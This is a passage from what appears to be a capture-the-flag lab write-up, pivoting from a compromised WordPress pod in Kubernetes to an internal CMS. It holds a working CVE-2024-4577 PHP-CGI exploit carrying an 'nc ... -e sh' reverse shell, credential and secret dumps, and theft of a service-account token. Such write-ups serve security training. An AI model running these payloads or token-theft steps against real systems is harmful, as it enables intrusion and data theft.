class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line">&lt;-7bdb994b9d-wbcm8:/opt/bitnami/wordpress/wp-admin$ env</span><br><span class="line">env</span><br><span class="line">BETA_VINO_WP_MARIADB_SERVICE_PORT=3306</span><br><span class="line">KUBERNETES_SERVICE_PORT_HTTPS=443</span><br><span class="line">WORDPRESS_SMTP_PASSWORD=</span><br><span class="line">WORDPRESS_SMTP_FROM_EMAIL=</span><br><span class="line">BETA_VINO_WP_WORDPRESS_PORT_443_TCP_PORT=443</span><br><span class="line">WEB_SERVER_HTTP_PORT_NUMBER=8080</span><br><span class="line">WORDPRESS_RESET_DATA_PERMISSIONS=no</span><br><span class="line">KUBERNETES_SERVICE_PORT=443</span><br><span class="line">WORDPRESS_EMAIL=user@example.com</span><br><span class="line">WP_CLI_CONF_FILE=/opt/bitnami/wp-cli/conf/wp-cli.yml</span><br><span class="line">WORDPRESS_DATABASE_HOST=beta-vino-wp-mariadb</span><br><span class="line">MARIADB_PORT_NUMBER=3306</span><br><span class="line">MODULE=wordpress</span><br><span class="line">WORDPRESS_SMTP_FROM_NAME=FirstName LastName</span><br><span class="line">HOSTNAME=beta-vino-wp-wordpress-7bdb994b9d-wbcm8</span><br><span class="line">WORDPRESS_SMTP_PORT_NUMBER=</span><br><span class="line">BETA_VINO_WP_MARIADB_PORT_3306_TCP_PROTO=tcp</span><br><span class="line">WORDPRESS_EXTRA_CLI_ARGS=</span><br><span class="line">APACHE_BASE_DIR=/opt/bitnami/apache</span><br><span class="line">LEGACY_INTRANET_SERVICE_PORT_5000_TCP_PORT=5000</span><br><span class="line">APACHE_VHOSTS_DIR=/opt/bitnami/apache/conf/vhosts</span><br><span class="line">WEB_SERVER_DEFAULT_HTTP_PORT_NUMBER=8080</span><br><span class="line">WP_NGINX_SERVICE_PORT_80_TCP=tcp://10.43.4.242:80</span><br><span class="line">WORDPRESS_ENABLE_DATABASE_SSL=no</span><br><span class="line">WP_NGINX_SERVICE_PORT_80_TCP_PROTO=tcp</span><br><span class="line">APACHE_DAEMON_USER=daemon</span><br><span class="line">BITNAMI_ROOT_DIR=/opt/bitnami</span><br><span class="line">LEGACY_INTRANET_SERVICE_SERVICE_HOST=10.43.2.241</span><br><span class="line">WORDPRESS_BASE_DIR=/opt/bitnami/wordpress</span><br><span class="line">WORDPRESS_SCHEME=http</span><br><span class="line">WORDPRESS_LOGGED_IN_SALT=</span><br><span class="line">BETA_VINO_WP_WORDPRESS_PORT_80_TCP=tcp://10.43.61.204:80</span><br><span class="line">WORDPRESS_DATA_TO_PERSIST=wp-config.php wp-content</span><br><span class="line">WORDPRESS_HTACCESS_OVERRIDE_NONE=no</span><br><span class="line">WORDPRESS_DATABASE_SSL_CERT_FILE=</span><br><span class="line">APACHE_HTTPS_PORT_NUMBER=8443</span><br><span class="line">PWD=/opt/bitnami/wordpress/wp-admin</span><br><span class="line">OS_FLAVOUR=debian-12</span><br><span class="line">WORDPRESS_SMTP_PROTOCOL=</span><br><span class="line">WORDPRESS_CONF_FILE=/opt/bitnami/wordpress/wp-config.php</span><br><span class="line">LEGACY_INTRANET_SERVICE_PORT_5000_TCP=tcp://10.43.2.241:5000</span><br><span class="line">WP_CLI_BASE_DIR=/opt/bitnami/wp-cli</span><br><span class="line">WORDPRESS_VOLUME_DIR=/bitnami/wordpress</span><br><span class="line">WP_CLI_CONF_DIR=/opt/bitnami/wp-cli/conf</span><br><span class="line">APACHE_BIN_DIR=/opt/bitnami/apache/bin</span><br><span class="line">BETA_VINO_WP_MARIADB_SERVICE_PORT_MYSQL=3306</span><br><span class="line">WORDPRESS_PLUGINS=none</span><br><span class="line">WORDPRESS_FIRST_NAME=FirstName</span><br><span class="line">MARIADB_HOST=beta-vino-wp-mariadb</span><br><span class="line">WORDPRESS_EXTRA_WP_CONFIG_CONTENT=</span><br><span class="line">WORDPRESS_MULTISITE_ENABLE_NIP_IO_REDIRECTION=no</span><br><span class="line">WORDPRESS_DATABASE_USER=bn_wordpress</span><br><span class="line">PHP_DEFAULT_UPLOAD_MAX_FILESIZE=80M</span><br><span class="line">WORDPRESS_AUTH_KEY=</span><br><span class="line">BETA_VINO_WP_MARIADB_PORT_3306_TCP=tcp://10.43.147.82:3306</span><br><span class="line">WORDPRESS_MULTISITE_NETWORK_TYPE=subdomain</span><br><span class="line">APACHE_DEFAULT_CONF_DIR=/opt/bitnami/apache/conf.default</span><br><span class="line">WORDPRESS_DATABASE_SSL_KEY_FILE=</span><br><span class="line">WORDPRESS_LOGGED_IN_KEY=</span><br><span class="line">APACHE_CONF_DIR=/opt/bitnami/apache/conf</span><br><span class="line">HOME=/</span><br><span class="line">KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443</span><br><span class="line">WEB_SERVER_DAEMON_GROUP=daemon</span><br><span class="line">PHP_DEFAULT_POST_MAX_SIZE=80M</span><br><span class="line">WORDPRESS_ENABLE_HTTPS=no</span><br><span class="line">BETA_VINO_WP_WORDPRESS_SERVICE_PORT=80</span><br><span class="line">BETA_VINO_WP_WORDPRESS_SERVICE_PORT_HTTPS=443</span><br><span class="line">WORDPRESS_TABLE_PREFIX=wp_</span><br><span class="line">WORDPRESS_DATABASE_PORT_NUMBER=3306</span><br><span class="line">WORDPRESS_DATABASE_NAME=bitnami_wordpress</span><br><span class="line">LEGACY_INTRANET_SERVICE_SERVICE_PORT_HTTP=5000</span><br><span class="line">APACHE_HTTP_PORT_NUMBER=8080</span><br><span class="line">WP_NGINX_SERVICE_SERVICE_HOST=10.43.4.242</span><br><span class="line">WP_NGINX_SERVICE_PORT=tcp://10.43.4.242:80</span><br><span class="line">WP_CLI_DAEMON_GROUP=daemon</span><br><span class="line">APACHE_DEFAULT_HTTP_PORT_NUMBER=8080</span><br><span class="line">BETA_VINO_WP_MARIADB_PORT=tcp://10.43.147.82:3306</span><br><span class="line">WORDPRESS_MULTISITE_FILEUPLOAD_MAXK=81920</span><br><span class="line">WORDPRESS_AUTO_UPDATE_LEVEL=none</span><br><span class="line">BITNAMI_DEBUG=false</span><br><span class="line">LEGACY_INTRANET_SERVICE_SERVICE_PORT=5000</span><br><span class="line">LEGACY_INTRANET_SERVICE_PORT_5000_TCP_ADDR=10.43.2.241</span><br><span class="line">WORDPRESS_USERNAME=user</span><br><span class="line">BETA_VINO_WP_WORDPRESS_PORT=tcp://10.43.61.204:80</span><br><span class="line">WORDPRESS_ENABLE_XML_RPC=no</span><br><span class="line">WORDPRESS_BLOG_NAME=User&#x27;s Blog!</span><br><span class="line">WP_NGINX_SERVICE_PORT_80_TCP_ADDR=10.43.4.242</span><br><span class="line">APACHE_PID_FILE=/opt/bitnami/apache/var/run/httpd.pid</span><br><span class="line">WORDPRESS_AUTH_SALT=</span><br><span class="line">APACHE_LOGS_DIR=/opt/bitnami/apache/logs</span><br><span class="line">WORDPRESS_EXTRA_INSTALL_ARGS=</span><br><span class="line">BETA_VINO_WP_MARIADB_PORT_3306_TCP_PORT=3306</span><br><span class="line">APACHE_DAEMON_GROUP=daemon</span><br><span class="line">WORDPRESS_NONCE_KEY=</span><br><span class="line">WEB_SERVER_HTTPS_PORT_NUMBER=8443</span><br><span class="line">WORDPRESS_SMTP_HOST=</span><br><span class="line">WP_NGINX_SERVICE_SERVICE_PORT_HTTP=80</span><br><span class="line">WORDPRESS_NONCE_SALT=</span><br><span class="line">APACHE_DEFAULT_HTTPS_PORT_NUMBER=8443</span><br><span class="line">APACHE_CONF_FILE=/opt/bitnami/apache/conf/httpd.conf</span><br><span class="line">WORDPRESS_MULTISITE_EXTERNAL_HTTP_PORT_NUMBER=80</span><br><span class="line">BETA_VINO_WP_WORDPRESS_PORT_443_TCP=tcp://10.43.61.204:443</span><br><span class="line">WEB_SERVER_DEFAULT_HTTPS_PORT_NUMBER=8443</span><br><span class="line">WP_NGINX_SERVICE_SERVICE_PORT=80</span><br><span class="line">WORDPRESS_LAST_NAME=LastName</span><br><span class="line">WP_NGINX_SERVICE_PORT_80_TCP_PORT=80</span><br><span class="line">WORDPRESS_ENABLE_MULTISITE=no</span><br><span class="line">WORDPRESS_SKIP_BOOTSTRAP=no</span><br><span class="line">WORDPRESS_MULTISITE_EXTERNAL_HTTPS_PORT_NUMBER=443</span><br><span class="line">SHLVL=2</span><br><span class="line">WORDPRESS_SECURE_AUTH_SALT=</span><br><span class="line">BITNAMI_VOLUME_DIR=/bitnami</span><br><span class="line">BETA_VINO_WP_MARIADB_PORT_3306_TCP_ADDR=10.43.147.82</span><br><span class="line">BETA_VINO_WP_WORDPRESS_PORT_80_TCP_PORT=80</span><br><span class="line">KUBERNETES_PORT_443_TCP_PROTO=tcp</span><br><span class="line">BITNAMI_APP_NAME=wordpress</span><br><span class="line">WORDPRESS_DATABASE_PASSWORD=sW5sp4spa3u7RLyetrekE4oS</span><br><span class="line">APACHE_HTDOCS_DIR=/opt/bitnami/apache/htdocs</span><br><span class="line">BETA_VINO_WP_WORDPRESS_SERVICE_HOST=10.43.61.204</span><br><span class="line">WEB_SERVER_GROUP=daemon</span><br><span class="line">WORDPRESS_PASSWORD=O8F7KR5zGi</span><br><span class="line">KUBERNETES_PORT_443_TCP_ADDR=10.43.0.1</span><br><span class="line">APACHE_HTACCESS_DIR=/opt/bitnami/apache/conf/vhosts/htaccess</span><br><span class="line">WORDPRESS_DEFAULT_DATABASE_HOST=mariadb</span><br><span class="line">WORDPRESS_SECURE_AUTH_KEY=</span><br><span class="line">BETA_VINO_WP_WORDPRESS_PORT_443_TCP_PROTO=tcp</span><br><span class="line">APACHE_TMP_DIR=/opt/bitnami/apache/var/run</span><br><span class="line">APP_VERSION=6.8.1</span><br><span class="line">BETA_VINO_WP_WORDPRESS_PORT_443_TCP_ADDR=10.43.61.204</span><br><span class="line">ALLOW_EMPTY_PASSWORD=yes</span><br><span class="line">WP_CLI_DAEMON_USER=daemon</span><br><span class="line">BETA_VINO_WP_WORDPRESS_SERVICE_PORT_HTTP=80</span><br><span class="line">KUBERNETES_SERVICE_HOST=10.43.0.1</span><br><span class="line">KUBERNETES_PORT=tcp://10.43.0.1:443</span><br><span class="line">KUBERNETES_PORT_443_TCP_PORT=443</span><br><span class="line">WP_CLI_BIN_DIR=/opt/bitnami/wp-cli/bin</span><br><span class="line">WORDPRESS_VERIFY_DATABASE_SSL=yes</span><br><span class="line">OS_NAME=linux</span><br><span class="line">BETA_VINO_WP_WORDPRESS_PORT_80_TCP_PROTO=tcp</span><br><span class="line">APACHE_SERVER_TOKENS=Prod</span><br><span class="line">PATH=/opt/bitnami/apache/bin:/opt/bitnami/common/bin:/opt/bitnami/common/bin:/opt/bitnami/mysql/bin:/opt/bitnami/common/bin:/opt/bitnami/php/bin:/opt/bitnami/php/sbin:/opt/bitnami/apache/bin:/opt/bitnami/mysql/bin:/opt/bitnami/wp-cli/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">LEGACY_INTRANET_SERVICE_PORT_5000_TCP_PROTO=tcp</span><br><span class="line">WORDPRESS_ENABLE_HTACCESS_PERSISTENCE=no</span><br><span class="line">WORDPRESS_ENABLE_REVERSE_PROXY=no</span><br><span class="line">LEGACY_INTRANET_SERVICE_PORT=tcp://10.43.2.241:5000</span><br><span class="line">WORDPRESS_SMTP_USER=</span><br><span class="line">WEB_SERVER_TYPE=apache</span><br><span class="line">WORDPRESS_MULTISITE_HOST=</span><br><span class="line">PHP_DEFAULT_MEMORY_LIMIT=512M</span><br><span class="line">WORDPRESS_OVERRIDE_DATABASE_SETTINGS=no</span><br><span class="line">WORDPRESS_DATABASE_SSL_CA_FILE=</span><br><span class="line">WEB_SERVER_DAEMON_USER=daemon</span><br><span class="line">OS_ARCH=amd64</span><br><span class="line">BETA_VINO_WP_WORDPRESS_PORT_80_TCP_ADDR=10.43.61.204</span><br><span class="line">BETA_VINO_WP_MARIADB_SERVICE_HOST=10.43.147.82</span><br><span class="line">_=/usr/bin/env</span><br><span class="line">&lt;-7bdb994b9d-wbcm8:/opt/bitnami/wordpress/wp-admin$</span><br></pre></td></tr></table></figure></div>
+
+<p>The key takeaways here: <code>WORDPRESS_DATABASE_PASSWORD=sW5sp4spa3u7RLyetrekE4oS</code>, the MariaDB host, and most importantly <code>LEGACY_INTRANET_SERVICE_PORT=tcp://10.43.2.241:5000</code> — another service living inside the cluster.</p>
+<p>We also find credentials mounted under <code>/secrets</code>:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;ess-7bdb994b9d-wbcm8:/secrets$ cat mariadb-password</span><br><span class="line">sW5sp4spa3u7RLyetrekE4oSI have no name!@beta-vino-wp-wordpress-7bdb994b9d-wbcm8:/secrets$ cat mariadb-root-password</span><br><span class="line">&lt;bdb994b9d-wbcm8:/secrets$ cat mariadb-root-password</span><br><span class="line">sW5sp4syetre32828383kE4oSI have no name!@beta-vino-wp-wordpress-7bdb994b9d-wbcm8:/secrets$</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Pivoting-to-the-Legacy-Intranet-CMS"><a href="#Pivoting-to-the-Legacy-Intranet-CMS" class="headerlink" title="Pivoting to the Legacy Intranet CMS"></a>Pivoting to the Legacy Intranet CMS</h2><p>No <code>curl</code> or <code>wget</code> in the container, so we use PHP’s <code>file_get_contents</code> to reach the internal service:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&lt;-7bdb994b9d-wbcm8:/opt/bitnami/wordpress/wp-admin$ php -r &#x27;$data = &quot;test=data&quot;; $opts = [&quot;http&quot; =&gt; [&quot;method&quot; =&gt; &quot;POST&quot;, &quot;header&quot; =&gt; &quot;Content-Type: application/x-www-form-urlencoded&quot;, &quot;content&quot; =&gt; $data]]; $context = stream_context_create($opts); echo file_get_contents(&quot;http://10.43.2.241:5000&quot;, false, $context);&#x27;</span><br><span class="line"></span><br><span class="line">&lt;tents(&quot;http://10.43.2.241:5000&quot;, false, $context);&#x27;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;GiveBack LLC Internal CMS&lt;/title&gt;</span><br><span class="line">  &lt;!-- Developer note: phpinfo accessible via debug mode during migration window --&gt;</span><br><span class="line">  &lt;style&gt;</span><br><span class="line">    body &#123; font-family: Arial, sans-serif; margin: 40px; background: #f9f9f9; &#125;</span><br><span class="line">    .header &#123; color: #333; border-bottom: 1px solid #ccc; padding-bottom: 10px; &#125;</span><br><span class="line">    .info &#123; background: #eef; padding: 15px; margin: 20px 0; border-radius: 5px; &#125;</span><br><span class="line">    .warning &#123; background: #fff3cd; border: 1px solid #ffeeba; padding: 10px; margin: 10px 0; &#125;</span><br><span class="line">    .resources &#123; margin: 20px 0; &#125;</span><br><span class="line">    .resources li &#123; margin: 5px 0; &#125;</span><br><span class="line">    a &#123; color: #007bff; text-decoration: none; &#125;</span><br><span class="line">    a:hover &#123; text-decoration: underline; &#125;</span><br><span class="line">  &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;div class=&quot;header&quot;&gt;</span><br><span class="line">    &lt;h1&gt;🏢 GiveBack LLC Internal CMS System&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;&lt;em&gt;Development Environment – Internal Use Only&lt;/em&gt;&lt;/p&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">  &lt;div class=&quot;warning&quot;&gt;</span><br><span class="line">    &lt;h4&gt;⚠ Legacy Notice&lt;/h4&gt;</span><br><span class="line">    &lt;p&gt;**SRE** - This system still includes legacy CGI support. Cluster misconfiguration may likely expose internal scripts.&lt;/p&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">  &lt;div class=&quot;resources&quot;&gt;</span><br><span class="line">    &lt;h3&gt;Internal Resources&lt;/h3&gt;</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">      &lt;li&gt;&lt;a href=&quot;/admin/&quot;&gt;/admin/&lt;/a&gt; — VPN Required&lt;/li&gt;</span><br><span class="line">      &lt;li&gt;&lt;a href=&quot;/backups/&quot;&gt;/backups/&lt;/a&gt; — VPN Required&lt;/li&gt;</span><br><span class="line">      &lt;li&gt;&lt;a href=&quot;/runbooks/&quot;&gt;/runbooks/&lt;/a&gt; — VPN Required&lt;/li&gt;</span><br><span class="line">      &lt;li&gt;&lt;a href=&quot;/legacy-docs/&quot;&gt;/legacy-docs/&lt;/a&gt; — VPN Required&lt;/li&gt;</span><br><span class="line">      &lt;li&gt;&lt;a href=&quot;/debug/&quot;&gt;/debug/&lt;/a&gt; — Disabled&lt;/li&gt;</span><br><span class="line">      &lt;li&gt;&lt;a href=&quot;/cgi-bin/info&quot;&gt;/cgi-bin/info&lt;/a&gt; — CGI Diagnostics&lt;/li&gt;</span><br><span class="line">      &lt;li&gt;&lt;a href=&quot;/cgi-bin/php-cgi&quot;&gt;/cgi-bin/php-cgi&lt;/a&gt; — PHP-CGI Handler&lt;/li&gt;</span><br><span class="line">      &lt;li&gt;&lt;a href=&quot;/phpinfo.php&quot;&gt;/phpinfo.php&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">      &lt;li&gt;&lt;a href=&quot;/robots.txt&quot;&gt;/robots.txt&lt;/a&gt; — Crawlers: Disallowed&lt;/li&gt;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">  &lt;div class=&quot;info&quot;&gt;</span><br><span class="line">    &lt;h3&gt;Developer Note&lt;/h3&gt;</span><br><span class="line">    &lt;p&gt;This CMS was originally deployed on Windows IIS using &lt;code&gt;php-cgi.exe&lt;/code&gt;.</span><br><span class="line">    During migration to Linux, the Windows-style CGI handling was retained to ensure</span><br><span class="line">    legacy scripts continued to function without modification.&lt;/p&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>GiveBack LLC Internal CMS</strong> with <code>/cgi-bin/php-cgi</code> exposed and a developer note about Windows-style CGI handling being retained during migration to Linux. This is textbook <a class="link"   target="_blank" rel="noopener" href="https://github.com/watchtowrlabs/CVE-2024-4577" >CVE-2024-4577 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</p>
+<h2 id="CVE-2024-4577-PHP-CGI-Argument-Injection"><a href="#CVE-2024-4577-PHP-CGI-Argument-Injection" class="headerlink" title="CVE-2024-4577 (PHP-CGI Argument Injection)"></a>CVE-2024-4577 (PHP-CGI Argument Injection)</h2><p>We exploit the PHP-CGI handler using the soft-hyphen (<code>%AD</code>) bypass to inject <code>allow_url_include</code> and <code>auto_prepend_file=php://input</code>, sending a reverse shell as the POST body — all from inside the WordPress pod using PHP:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;-7bdb994b9d-wbcm8:/opt/bitnami/wordpress/wp-admin$  php -r &#x27;$u=&quot;http://10.43.2.241:5000/cgi-bin/php-cgi?%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input&quot;; $d=&quot;nc 10.10.16.7 9002 -e sh&quot;; $h=&quot;Content-Type: application/x-www-form-urlencoded\r\nUser-Agent: curl/7.79.1\r\n&quot;; $ctx=stream_context_create([&quot;http&quot;=&gt;[&quot;method&quot;=&gt;&quot;POST&quot;,&quot;header&quot;=&gt;$h,&quot;content&quot;=&gt;$d]]); echo file_get_contents($u,false,$ctx);&#x27;</span><br><span class="line">&lt;nt&quot;=&gt;$d]]); echo file_get_contents($u,false,$ctx);&#x27;</span><br></pre></td></tr></table></figure></div>
+
+<p>On our second listener:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ rlwrap nc -lvnp 9002</span><br><span class="line">listening on [any] 9002 ...</span><br><span class="line">connect to [10.10.16.7] from (UNKNOWN) [10.129.183.181] 10146</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)</span><br></pre></td></tr></table></figure></div>
+
+<p>Root in the legacy CMS pod.</p>
+<h2 id="Stealing-the-Kubernetes-Service-Account-Token"><a href="#Stealing-the-Kubernetes-Service-Account-Token" class="headerlink" title="Stealing the Kubernetes Service Account Token"></a>Stealing the Kubernetes Service Account Token</h2><p>This pod has a service account token mounted at the default path:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br><span class="line">/run/secrets/kubernetes.io/serviceaccount</span><br><span class="line">ls</span><br><span class="line">ca.crt</span><br><span class="line">namespace</span><br><span class="line">token</span><br><span class="line">cat token</span><br><span class="line">eyJhbGciOiJSUzI1NiIsImtpZCI6Inp3THEyYUhkb19sV3VBcGFfdTBQa1c1S041TkNiRXpYRS11S0JqMlJYWjAifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxNzkzODUxOTQyLCJpYXQiOjE3NjIzMTU5NDIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiYWFkYmRhZjQtZGFhNy00NjFlLTlmYmQtYjc2ZGFiMmViODJhIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0Iiwibm9kZSI6eyJuYW1lIjoiZ2l2ZWJhY2suaHRiIiwidWlkIjoiMTJhOGE5Y2YtYzM1Yi00MWYzLWIzNWEtNDJjMjYyZTQzMDQ2In0sInBvZCI6eyJuYW1lIjoibGVnYWN5LWludHJhbmV0LWNtcy02ZjdiZjVkYjg0LWdiOTc1IiwidWlkIjoiMDc5NDAzMjMtNjMyYi00NDA5LTkxMWItYzJmZmExZmJkY2E5In0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJzZWNyZXQtcmVhZGVyLXNhIiwidWlkIjoiNzJjM2YwYTUtOWIwOC00MzhhLWEzMDctYjYwODc0NjM1YTlhIn0sIndhcm5hZnRlciI6MTc2MjMxOTU0OX0sIm5iZiI6MTc2MjMxNTk0Miwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRlZmF1bHQ6c2VjcmV0LXJlYWRlci1zYSJ9.xY-uVE2BDoziCUKc9_SHDlFbpkhgONk2O7l3W3JVeHlBuKVDH4_4Y62eiwjP-_tgBFsgXxlekkyL-5REXjmE6yuHGoXuMW1iYIa1GcUeWENCa-EDFHCD8MPLBnE9I4iXsLk60eJfiJ7DTH87r-nF9HSPbd5ddfPVO2f5AaTo_hHnmER1iY7wLBOHxtIh4pnm2avm_BZ3JsE92uCqdLthHAVNbWxYr2Xs5DoQssLRC7wH5OSYvpmv9ztNyXfbBPJGKB-4squKR78oS9C2XSlpR_QRtnvkhgGnU0R8IYs6ldhZdtlDtw_f5NGjnPZA2csJkuhqMBjlyofhPAyUJQQOqg</span><br></pre></td></tr></table></figure></div>
+
+<p>Decoding the JWT payload reveals the service account is <code>secret-reader-sa</code>. We use it to query the Kubernetes Secrets API:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span 